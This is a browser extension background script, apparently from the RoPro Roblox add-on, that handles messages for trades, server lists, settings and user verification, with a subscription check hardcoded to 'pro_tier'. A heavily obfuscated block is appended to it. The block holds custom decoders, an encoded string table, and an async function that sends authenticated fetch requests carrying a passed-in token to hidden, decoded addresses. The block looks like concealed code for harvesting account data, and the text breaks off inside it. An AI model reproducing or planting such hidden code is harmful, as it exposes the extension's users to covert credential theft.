chrome.runtime.onMessage.addListener(function(request,sender,sendResponse)
{
	switch(request.greeting) {
		case "GetURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPost() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.post({'url':request.url, 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data) {
						sendResponse(data);
					}).fail(function() {
						sendResponse("ERROR")
					})
				}
				doPost()
			} else {
				$.get(request.url, function(data) {
					sendResponse(data);
				}).fail(function() {
					sendResponse("ERROR")
				})
			}
			break;
		case "GetURLCached":
			$.get({url: request.url, headers: {'Cache-Control': 'public, max-age=604800', 'Pragma': 'public, max-age=604800'}}, function(data) {
				sendResponse(data);
			}).fail(function() {
				sendResponse("ERROR")
			})
			break;
		case "PostURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPostURL() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
						data: request.jsonData,
						success: function(data) {
							sendResponse(data);
						}
					})
				}
				doPostURL()
			} else {
				$.ajax({
					url: request.url,
					type: "POST",
					data: request.jsonData,
					success: function(data) {
						sendResponse(data);
					}
				})
			}
			break;
		case "PostValidatedURL":
			$.ajax({
				url: request.url,
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: request.jsonData,
				success: function(data) {
					if (!("errors" in data)) {
						sendResponse(data);
					} else {
						sendResponse(null)
					}
				},
				error: function(response) {
					if (response.status != 403) {
						sendResponse(null)
					}
					token = response.getResponseHeader('x-csrf-token')
					myToken = token
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {"X-CSRF-TOKEN": myToken},
						contentType: 'application/json',
						data: request.jsonData,
						success: function(data) {
							if (!("errors" in data)) {
								sendResponse(data);
							} else {
								sendResponse(null)
							}
						},
						error: function(response) {
							sendResponse(null)
						}
					})
				}
			})
			break;
		case "GetStatusCode": 
			$.get({url: request.url}).always(function(r, e, s){
				sendResponse(r.status)
			})
			break;
		case "ValidateLicense":
			subscriptionManager.validateLicense()
			tradeNotifierInitialized = false
			break;
		case "DeclineTrade": 
			$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN': myToken}}, function(data,error,res) {
				sendResponse(res.status)
			}).fail(function(r, e, s){
				if (r.status == 403) {
					$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN' : r.getResponseHeader('x-csrf-token')}}, function(data,error,res) {
						sendResponse(r.status)
					})
				} else {
					sendResponse(r.status)
				}
			})
			break;
		case "GetUserID":
			$.get('https://users.roblox.com/v1/users/authenticated', function(data,error,res) {
				sendResponse(data['id'])
			})
			break;
		case "GetCachedTrades":
			sendResponse(inboundsCache)
			break;
		case "DoCacheTrade":
			function loadInbound(id) {
				if (id in inboundsCache && inboundsCache[id] != null) {
					sendResponse([inboundsCache[id], 1])
				} else {
					$.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
						console.log(data)
						inboundsCache[data.id] = data
						sendResponse([data, 0])
					}).fail(function(r, e, s) {
						sendResponse(r.status)
					})
				}
            }
            loadInbound(request.tradeId)
			break;
		case "GetUsername":
			async function getUsername(){
				username = await getStorage("rpUsername")
				sendResponse(username)
			}
			getUsername()
			break;
		case "GetUserInventory":
				async function getInventory(){
					inventory = await loadInventory(request.userID)
					sendResponse(inventory)
				}
				getInventory()
				break;
		case "GetUserLimitedInventory":
			async function getLimitedInventory(){
				inventory = await loadLimitedInventory(request.userID)
				sendResponse(inventory)
			}
			getLimitedInventory()
			break;
		case "ServerFilterReverseOrder":
				async function getServerFilterReverseOrder(){
					var serverList = await serverFilterReverseOrder(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterReverseOrder()
				break;
		case "ServerFilterNotFull":
				async function getServerFilterNotFull(){
					var serverList = await serverFilterNotFull(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterNotFull()
				break;
		case "ServerFilterRandomShuffle":
				async function getServerFilterRandomShuffle(){
					var serverList = await serverFilterRandomShuffle(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterRandomShuffle()
				break;
		case "ServerFilterRegion":
				async function getServerFilterRegion(){
					var serverList = await serverFilterRegion(request.gameID, request.serverLocation)
					sendResponse(serverList)
				}
				getServerFilterRegion()
				break;
		case "ServerFilterBestConnection":
				async function getServerFilterBestConnection(){
					var serverList = await serverFilterBestConnection(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterBestConnection()
				break;
		case "ServerFilterNewestServers":
			async function getServerFilterNewestServers(){
				var serverList = await serverFilterNewestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterNewestServers()
			break;
		case "ServerFilterOldestServers":
			async function getServerFilterOldestServers(){
				var serverList = await serverFilterOldestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterOldestServers()
			break;
		case "ServerFilterMaxPlayers":
			async function getServerFilterMaxPlayers(){
				servers = await maxPlayerCount(request.gameID, request.count)
				sendResponse(servers)
			}
			getServerFilterMaxPlayers()
			break;
		case "GetRandomServer":
			async function getRandomServer(){
				randomServerElement = await randomServer(request.gameID)
				sendResponse(randomServerElement)
			}
			getRandomServer()
			break;
		case "GetProfileValue":
			getProfileValue(request.userID).then(sendResponse)
			break;
		case "GetSetting":
			async function getSettings(){
				setting = await loadSettings(request.setting)
				sendResponse(setting)
			}
			getSettings()
			break;
		case "GetTrades":
			async function getTradesType(type){
				tradesType = await loadTradesType(type)
				sendResponse(tradesType)
			}
			getTradesType(request.type)
			break;
		case "GetTradesData":
			async function getTradesData(type){
				tradesData = await loadTradesData(type)
				sendResponse(tradesData)
			}
			getTradesData(request.type)
			break;
		case "GetSettingValidity":
			async function getSettingValidity(){
				valid = await loadSettingValidity(request.setting)
				sendResponse(valid)
			}
			getSettingValidity()
			break;
		case "GetSettingValidityInfo":
			async function getSettingValidityInfo(){
				valid = await loadSettingValidityInfo(request.setting)
				sendResponse(valid)
			}
			getSettingValidityInfo()
			break;
		case "CheckVerification":
			async function getUserVerification(){
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			getUserVerification()
			break;
		case "HandleUserVerification":
			async function doUserVerification(){
				verification = await verifyUser(request.verification_code)
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			doUserVerification()
			break;
		case "SyncSettings":
			syncSettings()
			setTimeout(function(){
				sendResponse("sync")
			}, 500)
			break;
		case "OpenOptions":
			chrome.tabs.create({url: chrome.extension.getURL('/options.html')})
			break;
		case "GetSubscription":
			async function doGetSubscription() {
				subscription = "pro_tier"
				sendResponse(subscription)
			}
			doGetSubscription()
			break;
		case "DeclineBots":
			async function doDeclineBots() {
				tradesDeclined = await declineBots()
				sendResponse(tradesDeclined)
			}
			doDeclineBots()
			break;
		case "GetMutualFriends":
			async function doGetMutualFriends(){
				mutuals = await mutualFriends(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFriends()
			break;
		case "GetMutualFollowers":
			async function doGetMutualFollowers(){
				mutuals = await mutualFollowers(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowers()
			break;
		case "GetMutualFollowing":
			async function doGetMutualFollowing(){
				mutuals = await mutualFollowing(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowing()
			break;
		case "GetMutualFavorites":
			async function doGetMutualFavorites(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualFavorites()
			break;
		case "GetMutualBadges":
			async function doGetMutualBadges(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualBadges()
			break;
		case "GetMutualGroups":
			async function doGetMutualGroups(){
				mutuals = await mutualGroups(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualGroups()
			break;
		case "GetMutualLimiteds":
			async function doGetMutualLimiteds(){
				mutuals = await mutualLimiteds(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualLimiteds()
			break;
		case "GetMutualItems":
			async function doGetMutualItems(){
				mutuals = await mutualItems(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualItems()
			break;
		case "GetItemValues":
			fetchItemValues(request.assetIds).then(sendResponse)
			break;
		case "CreateInviteTab":
			chrome.tabs.create({url: 'https://roblox.com/games/' + parseInt(request.placeid), active: false}, function(tab) {
				chrome.tabs.onUpdated.addListener(function tempListener (tabId , info) {
					if (tabId == tab.id && info.status === 'complete') {
						chrome.tabs.sendMessage(
							tabId,
							{type: "invite", key: request.key}
						  )
						chrome.tabs.onUpdated.removeListener(tempListener);
						setTimeout(function() {
							sendResponse(tab)
						}, 2000)
					}
				});
			})
			break;
		case "UpdateGlobalTheme":
			async function doLoadGlobalTheme(){
				await loadGlobalTheme()
				sendResponse()
			}
			doLoadGlobalTheme()
			break;
		case "LaunchCloudPlay":
			launchCloudPlayTab(request.placeID, request.serverID, request.accessCode)
			break;
	}

	return true;
});
var a,b,c,d,e,f,g,h,i;const j=[0x0,0x1,0x8,0xff,"length","undefined",0x3f,0x6,"fromCodePoint",0x7,0xc,"push",0x5b,0x1fff,0x58,0xd,0xe,0x7f,0x80,0xba,0xbb,0xaf,0xcf,0xd3,0xd5,0xd9,!0x0,0x97,0xb5,0xdf,0x77,0xe8,0xef,0xe9,0xea,null];function k(a){var c="o:HX9CR)8,3eu7r!{^?Fvx;40%_Q*fY5q(2+>UJ1/tE<slpgBAjc#=bVaO$D~T&wPKI}`6]GknmS@[WzNLydM.Z\"ih|",d,e,f,g,h,k,l;d=""+(a||"");e=d.length;f=[];g=j[0x0];h=j[0x0];k=-j[0x1];for(l=j[0x0];l<e;l++){var m=c.indexOf(d[l]);if(m===-j[0x1])continue;if(k<j[0x0]){k=m}else{k+=m*j[0xc];g|=k<<h;h+=(k&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{f.push(g&j[0x3]);g>>=j[0x2];h-=j[0x2]}while(h>j[0x9]);k=-j[0x1]}}if(k>-j[0x1]){f.push((g|k<<h)&j[0x3])}return n(f)}function l(c){if(typeof a[c]===j[0x5]){return a[c]=k(b[c])}return a[c]}a={};b=["s&@5BAb#er3Y:","&B6_MJ>HywVNa9","|Kl5&$qH","^p_SoMAg(Ol)bU4t8?/A;Wq>#,n}Vrr","bbkR0#.tY!;y\"_FQjOC5Q","[%u[B1&HE^8Q*ge%K^}=+nXtWe(@A{r",".]Hq+gGO7xK#0X$fW&Tm`m}7]F<X:k90:Ocq6B}6BI%k[B3","OG{c@j$Niv2X^{Z**`P,P~x)$Kk[py<_Hu]#Q.(O>buzT%y/f~+3%","kK[@Q/2?h^6I:","uw;,{@o","_`Df8Zx7.Fq6^C/_g&_SJ`N0)","Tbnc2b0mybs#ejX5tO;5]~iZAwQ","4O0,tNkp+,vV|6:>J&:","e<anfG\"))v}[!ds1:ws)|JG:","lG5AjAs#`b]~\"ro?NRAcq+$YLb2B8!<_XO~51`@$Sec","zDZ@G2!:","1B;98&g:YD.~[>;2P^\"Aa~LO$&7kk0(Udnp9","!c0W}2P`~ai;]%`5=bc3EAR#AIlnVX","=`>5q/lOrxQ2<yB2#v[5^GmZIuja$715``19++Q=L??KbU@Jyo","W%0RZ(_8!x4Rf9l1C9/Rsc08Der^+y|*tBP,w1h^+~&aYT?v=o","]&dfOwc.X,","bcwRFDdzg!(B:","q~S_u&.4)7J2zHjQGUdqu@|2uxZLk!{_o?+q!&g)h^u`I7GF4G>3KkP0VPFQ:","jbP,G6?#Erxz`!u_6&/A.l)=,$XSK%\";tfr)uB3?*KK8m6]J_2q,","*KM=|OH0A,dm@k1F44z#fDXF+,^UYU6F?GGnn@c4~^","*p~f{GS)Awh}Zr!Q_UQqzGwcX","W5^S_.s/oxXR[9Fv#RCV5+[tPut+K>AQwb/R","8O%k\"ON23rs^kD|{.]>576T7RP13sgkFCu&V4GxFh$Z}%B<%","FmV#HL5F+F53BQE_ccG9Z6G:","A5c[?6vNCFh]~XQ*)<Sf*D)FZF*#!y)FbBPn5nT:",";`(bpTo","cbNnSj{ZDD<BQy[1H<8W6mC%8$50/Q~YiB&@NJHNKwuQX_T4tuX","vm}f<wY>EK$]!GnF<fzA]kg)dbs*rCq^P^#3I>F:","!AG@4W~$VP$]zDH?sU[5oZo","Kcw#tnyN:On8kd&0[^[jd&ip^,(rbTX%yBjc++o","T2in=kkR3^U","=KjQ.#C:l&<+_Tl1~_W5\"j4tkv","6l95MJ`YAwv5n>e%UUR@L6>?MFvSe1GUb_ef}p@0B?e3A9","kK])o$//:I;vn9OEgcS[l[lwc,","%!Sf*JO+z~V5HUU%}l=3\"Jl+C","2~._KV5+C7MuTBW/8qmq4O^={!yeO~J%5~6j#Mo","ZEQq0/VgsrANb$HY5RES#a4F$^","lKz*;WpH",",<=mw1lF?uS}#X%EGlk,a2Ogi7An1da2CbCmqN\".B~e`f{95d*H","kbES\"jB$FF0R,MT+!wBnn@m$er20&A,1$4l)pT@/SrvSk9[_Dv`_mLPYIwj","=R.G(Aku#,iO.9GJ","V&u5Q.o?&D*kD$H>_q1,.jZ/trG[@0iEQvb@Qb}7(?XRG$J0","Bup)V]ht^!Ix1y`YT*BA[6=4p?bx!_3","%v/n|WStUFtVd_Y^{p?QQD\"^C","mK}=>b|Z#PoW$rMQg_PR;.@$XunpU9U5ER9CcASc_Du7vX02R~#)","8fEQC>y/#O;^Ak9?TnJ*.G:LivmAh01Ft_0n0",";fl3udT4t&Hch~C0/^N,`&[f_^+z:","PDm=f#!7Ku|P6B(0g5]G4OZp$ek+E7R<&*kb,Bnf,$)v,>!1X4^c&mo","SD%Q\"g)tw?vzkk|*T&^Y(.zfjw3b*de%cKsf7Lb/BOSN~Qn%",">,PR.D.:","54Lc0WvH2F_^eH(ET`6)","ic!Y,~<:Orc5vQO4yD(S_dPRJ7KA<$6FCbw,","}`QfXBv8J$S=gJS1sUmq:L&?7&VA>g3",">Xv[y60N#P];NGJ0H?@_iO&Yg![=@dZ/Dbsfrm8>R7r`BQd/%4]5C=KcLO>",";4~3#1c)0^/","JG+[Zj4+z=U*T>20BXQfo>8#2Feye_*E~_CVx","#2Y5&ksH","J&}j~M!%w~{SaX5Y8:","Fm5A*ga`Q^q6}]XYSDI=4O\")R$i%a!x+{up9","b`f9ENTSu&vc[0Ot%G:","!p8Sw~Ltg8[m:","L]MCy&a#eDc57{.2W&lmy&At7xFQ.08","fvUm;6up&DJV{X,5DKU5>Td:","EO(qJA2>hK>@TUq0sO`memmR?F>k>X","!?umx/q>gwk%!_{vu!xV8Bdz?uq@2]wUoAZ,1w4f{w&%;C42#5*fl[K:","jK(YSm()2!KqxBF2>X>m2AxLBuFknkIU.]^S%","7`eqBwXF)V,bX_u1icS==kqH","ef9j7m]RT=6xiXT4~_(Qv#\"t%r","89r@mjN/[&,4gJ;*L5CjHM=7|DoK~Dh+9I~)Y","=BG9Ac,tvPevNXCFtRX[RZnS]Pw*0QGFcb6@9mzc`PB*h~;t9`#fmBo","wb\"AQ/`?L,9gU9e_:+iAbwdf[DD9sgwYc_w,:p;H","ZBR5l+.4},r`py`5s5`Cq+%+@8S}gXWQl^F[/`pH","!Rnb.dW?8^(K/dlQrOf).6Tf@8","f~63>Sff9,}e+H","qc0c=$u$Qrm}4X","v/x5ENW2V7pVbU$*zKH[?jk#p?3`jJm_cXCV.dftQrqKA{7Q]vEQ0D}:v,","fm?Q6kvZ[=ymlTI?WK4AZlypaKg@T>QfxG4@iG:%`F^Y!H$f/B|f.GZ2H,L}o","<RT5]2ypq?p3p%9J#RhRAcVtR$\":/db2#lU3swfgC3fvETsJ","Pc9[&~.)I,]].>,1VKnc6ze=vP[8X]JU~&:","(c3f&MpHW=5VHT60@&7@UAIRIbx2l{F2$2(Yf.`uC",":!Y*)j.:3K%k<_>?~_D[wM]#R","=`^W)jpP+OENh0y2]4Ab,Vy$OK{kyH,?}nX","B5aAEUImp?TebA{QewSm36~pevjrpTZ28+._2DKtH~Sm#9","e<lm9=]pfI=N0XofVGR5nL)Ln^U*gHi2y*;#HB@ut^y;ida2X!z#~M(fR","ffx)^OO75xDIA9","Sv^cbwWpSekNN~:U6EZ*a~$H","y]an/b\"+6FuzHL3","kaY#TMipZ$E6OTUUfuCmsNqmm&QQ0GDf2XAR0ON#M70@Sdz1Xx1,","d*cq8jv8ou,k,C","6`c[BcvZTeSq9!ZQkDGb3Zf+PO{`~X","<vXf]=o","<&BboZ4fRPyq/QR?,uo,","eu:cb=$0:u#@GX","kB8,\"JU+yF56Nk@JUc)(UUzt:O>5I7kJD,z9Eb?$rx.a6B./U`qRQJ!tIF","3UY5?&]?|^UXFritbGKR0Wz7P,^y:","JmV99Vctw!15T~*Yv~;A:=@0HO:y3Tf^6`f#|@SOR","VD%RJA++s8_&rL0EV23SigL7)","89$c/a202uJ3^k,5%,\"nuBcFN~/#>DXYind[G~\"+uD{Y:","g&iRsbVtN!YV/G/_#o","xb@maw5Lw!YzO>G%N]&#8BEH,$3K+H","O`vm]z98N~!c69Z*",">!qY]kk?.PhLdrwER,]@tN`0C","Y!5*V[d)o?P%8!C?/Gg#b$]R:bNper,1,/R)<bcgZPj@m6[14m%cb]n:","~54,hO4+HOyC6B|;B_kR/S~?2uk9uQs_<_jc0/Ym[e55kX","neZ)uZq#ZF];rU3J8`:bg]\".~8RcsQ]5NRHQSLe%urp&`do<:wG,<]o",".nHcfDc7cFiwaX<JOv>3=wapJP5@+]3JnE8,M6$/o,+Q*XR0`BZ51y}:","cO|8KM3pR","oOqnvDc+\"7Zwk!8%1BZ)=ac.Z$hPO>)?aB2[,LNpuKH7:","((K+w[P=7,!}8]p<E~","e(P[i4]=","7x.ZZaB","]t,J!OGEo,Z5=#o","UOx3^LT._8v$SJ!1pubGYWkZ)^_$[NT+=4*[jSMZD=V]4gCFs&qQg1>uP,T[A7Z{i=qcVz^+\"$xcb7=++<?cPz3?mr>6Lk8?o,(bdGQF9O00I7iE1mZ9bk)%Z)N}|J>Y>!/A~$;p}~j6#k=*%<i,v","oXkjyw@P#0D?UT7%Ht)3*e<Uy!","3W0j[","@V^g<iXs(Ck[ex?>ufn?~ZY0aC&4P_8YoF{h,`WS]CvpgO5WQV`Zq3NM&<","SyfAH`WSv","sFHh\"{~j","uf|fVCITTVU1mLb1fUw","1yM,FEBSF~","w6S]r3kj","I?n?(","A`vA","|yV/Kw0*a.As?v(!\"HM\"F;wK511IM#F#9[V/[%SQap9_O}nf","m[jt)<~mg","*U)\">%ci","(j+jy.xBBy`Z2@TZj`A","Z[9]U:PmUc","AMmLkYWi","x5S5a","oXkjyw@P#0rxoTm+{rCx,>@I0~$1V2`]o*>ropzlV1Kv8","6JVi[rRr[Yl","u?BJ9jauF","xp9wPoe_","dB^Bbh8ttbqS*T.SBq(","S?VZprnupe","({u+`1>_","8<O<H","ipHD4>rZm(Kz$]ai%ik<~=ey0$mj{Q419XjWeL[KnIh9Z)^Uyb[SddY","ie7(Fl,&u$S\"Ar+NFb[SU3_}&","hb7(_#th&","Z+_S0lx}","F7f7p6w^^pGPoTMP7GV","Pby<+)Wh+x","V:hL{=X}","wO3O.","q`F31O8","C3[W_0:5#M@D9/~<aLEyvKjO{>;L,``zo<*)txm~H[\"{g::`a{9#l^`M+&:PSZ","uHIM$^}uB","5s$)QNtr","6IfI3?28831n!g.nI1F","nHl(sKqust","FZuy{Upr","2oPo|","7J?/ynhO]brN7i`1FrDN[.h)bY<9EZp+70mr7TULE9&R3","r\"ufJ%:DpyQ67ioVpp&ftM4mH9kSor`H67+_)0%|/tfgX`z+|$&DVzYn%a`c9UdH.7EfH(U!","YVuDQrwY|","OvQ%*zt!","quGuJb\"^^JTWk:6WuT>","WVL_v(=Yvt",">$YfNc[!","\"{g{]","oXkjyw@PtC~ZSxGop^Cx,>@I0~$1V2`]o*>r?IZlz*1QB","@96MQv\"@|","tUQlNC[{","F6i6=f?LL=4_oeP_64$","_9a;Uu]@U[","$^@nSH({","?hWhJ","oXkjyw@P#0sJjA[mq`;C$>ow&*p<5I(ylNE}l>3w`1SKUTU","~W=C6r(~s","Ik$1xu!p","3<P<QNH??Q52+TX2<5b","2a{/kn_#k!","bh#d.W0p","Hq[q]","#WafV4Qq|;+{FAa[9X=C#","SF2eqRAd]a=|]F$%UBH[Z/}b]a=","N`|jeYgR;y","W3Pm&yk_elB}Qk%5++8J|J,!e&DK6@^n@WA0)n;1G}#9z?b","dHZ{<)~*JlYK90ZEJ3BXMzp*;V7KH$_e=g2l*+G4v&p|yZFW.,1Ig","VX6Xe","?H7Jq","1+8JW(&aF","a(>gHdKb,#_|3{e!xC;T/;1","W3Pm&yk_ely9hk0~Yt${M:9!;Pv0hkkAc0YS4y+TG}r","*MU{l,<*<N7KokUt","tSLpJ)=o","s+HJB",":2dn9","r;M{.ySo","oXkjyw@PtC.p`Z9~a\"153rO:Jyl1V2`]LEkjC_TZ600S,A.&M&r5`RgRz*RST(W+%`h3.}B0]a=",",]pXd7:}2PO)Ic^gyw|=A_*(zd9|r8I\"CEpXP4<cu5f/JTO~h~_=I!>!n@!f<Yjs$IDAO6o5\"yx",":Wkje>!L","s`[sk","P\"aferO:gsZR!@h","v|RfU4Qs`1*vY2lo\"`af","i`l3l","{X=e;/pbB<z","t`aferO:s","*oF3MS{L","WWz/&R6L91*v/D","AB`C","P\"94x=uB?Z=6P?_#[&8G","t`D/`R8","&t2CXS{L","LDVei","B)G;.jALCF@bAmtq!B6sx?*l#^","jDNeer8","2=Jei","FfKei2^L","y&s}/wG%}y","x&Ne;/^L","B)bwoh7DR:X&SOL1F23ijw`Us","B)G;@oALq;+{FA]Vq|20XSp8","B)bww.AL)hKvFAoVb1~eMS8","B)G;D!ALq;>.B","B)G;:%ALZY]*Trd,jB","wNNeX/6lG","B)AFzVALJ05QqDF","716/Qw^L~zRSUTAopNKee>Hl%ae{L@#(","B)bwk[ALWXBuZx%V$W=eLT&l;y","E5M6u?JI!zRSUTAo$hN","B)bw}CAL_XhEUTU","M5j=u?@IJyH","Uzkje>)L",":tKCW4%L3XFJ>x{^e8","5fQ5jKJUG~","+EJe^IDC{!hlNHU","oXkjyw@P#0F?{2E,9&7exJqJJy^ZTrC+c^*rW4gbSay=RWzmt`Ve$>#~3CpY]@M,%ymxU%Q_9Y?xiD=$5fQ5;et%!<mI!Lcm??8xO|n!Vy^9(]W+5&hMITBB+a=","[`Tfer)L","oXkjyw@P#0kZjAtq\"&k}d}+Pmv]RB","oXkjyw@P#0F?{2E,9&7exJqJJy^ZTrC+c^*rW4gbSay=RWzmt`Ve$>#~3CpY]@M,/S;tY,+Pqy6Zh2J]}ofe&R|JU<1Q/zY,d0O/l$lh`CrKH@}#eXr}l>#~80Bur]nWqtkjbpOR.^)MNL}]hB","rEJe^IDC{!5","O={f","K5O0@/iJJy","f`;C$>ZL","d*=Cx?pcX^u*B","oXkjyw@P#0F?{2E,9&7exJqJJy^ZTrC+c^*rW4gbSay=RWzmt`Ve$>#~3CpY]@M,n0zre?thb~+*wDb$g,G3$rpc{<;vY20,8DE}Zet%!<mI!Lcm??8xt>@I0~:9cxE,%Wb/f4bc]a3{Bmc,=&hMITBB+a=","lXKewI+JJy?QGA","_<*[um,F)","?!x3","McB,","UOx3^LT.Q=:W6k7/[R9[wML^bPPI5d<J3:","H9eq%","7chcO=a??Oyfzr$fho","39XqqGo"];function m(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c,d;b=void 0x0;c=[];try{b=Object;c[j[0xb]]("".__proto__.constructor.name)}catch(f){}a:for(d=j[0x0];d<a[j[0x4]];d++)try{var g;b=a[d]();for(g=j[0x0];g<c[j[0x4]];g++)if(typeof b[c[g]]===j[0x5])continue a;return b}catch(f){}return b||this}c=m()||{};d=c.TextDecoder;e=c.Uint8Array;f=c.Buffer;g=c.String||String;h=c.Array||Array;i=function(){var a=new h(j[0x12]),b,c;b=g[j[0x8]]||g.fromCharCode;c=[];return function(d){var e,f,h,k;f=void 0x0;h=d[j[0x4]];c[j[0x4]]=j[0x0];for(k=j[0x0];k<h;){f=d[k++];f<=j[0x11]?e=f:f<=j[0x1d]?e=(f&0x1f)<<j[0x7]|d[k++]&j[0x6]:f<=j[0x20]?e=(f&0xf)<<j[0xa]|(d[k++]&j[0x6])<<j[0x7]|d[k++]&j[0x6]:g[j[0x8]]?e=(f&j[0x9])<<0x12|(d[k++]&j[0x6])<<j[0xa]|(d[k++]&j[0x6])<<j[0x7]|d[k++]&j[0x6]:(e=j[0x6],k+=0x3);c[j[0xb]](a[e]||(a[e]=b(e)))}return c.join("")}}();function n(a){return typeof d!==j[0x5]&&d?new d().decode(new e(a)):typeof f!==j[0x5]&&f?f.from(a).toString("utf-8"):i(a)}function o(c,d=j[0x1]){function e(c){var d="B~=.x`Azh@7!oIc(fY*FPu1ey&]^QHE+Z|M_GU:d<NstnDKR5?br2vJLkqgw)#$W3,m>}9\"a%SOCT[i0X4l6j{p8/V;",e,f,a,g,h,k,l;e=""+(c||"");f=e.length;a=[];g=j[0x0];h=j[0x0];k=-j[0x1];for(l=j[0x0];l<f;l++){var m=d.indexOf(e[l]);if(m===-j[0x1])continue;if(k<j[0x0]){k=m}else{k+=m*j[0xc];g|=k<<h;h+=(k&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{a.push(g&j[0x3]);g>>=j[0x2];h-=j[0x2]}while(h>j[0x9]);k=-j[0x1]}}if(k>-j[0x1]){a.push((g|k<<h)&j[0x3])}return n(a)}function f(c){if(typeof a[c]===j[0x5]){return a[c]=e(b[c])}return a[c]}Object[f(0x71)](c,f(0x72),{[f(0x73)]:d,[f(0x74)]:!0x1});return c}l(0x75);async function p(e,f,g,h,i,k,l,m,o,p,q,r,s){if(!g){g=function(e){if(typeof a[e]===j[0x5]){return a[e]=f(b[e])}return a[e]}}if(!f){f=function(e){var f="8BLNDAGsCfjVhUFWmy!~^k.E:it#6[l3e$,(%o]+&q\"`9|)u{xH=b05MYXZ;z@*<a1vK?ISrTQ4J}/>_Rwp2OPcdn7g",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}}h=await(await fetch(g(0x76)))[g(j[0x1e])]();if(e){function t(e){var f="*wjR6O7vABgK\"uLya<TS~^:%=Jx(H1M,]lkW$@c}>YFQq)d0;r8fPC?tIVb&5XN!z.4o3+D`[n{pZh9mEiU_Gs/e2|#",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function u(e){if(typeof a[e]===j[0x5]){return a[e]=t(b[e])}return a[e]}i=await(await fetch(u(0x78),{[u(0x79)]:{[u(0x7a)]:u(0x7b)+e},[u(0x7c)]:u(0x7d)}))[u(0x7e)]()}const v=i?i.id:g(j[0x11]);{function w(e){var f="dAioM8HgtP/6>(@[#KBmcV=4JrCa)Z9]LDW~q|fl!QU^X{7b3khjN.5ExyT_,0uF1pIRY?G<vS%nO\"s2:w`};*$z&+e",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function x(e){if(typeof a[e]===j[0x5]){return a[e]=w(b[e])}return a[e]}k=await(await fetch(x(j[0x12]),{[x(0x81)]:{[x(0x82)]:x(0x83)+e},[x(0x84)]:x(0x85)}))[x(0x86)]()}{function y(e){var 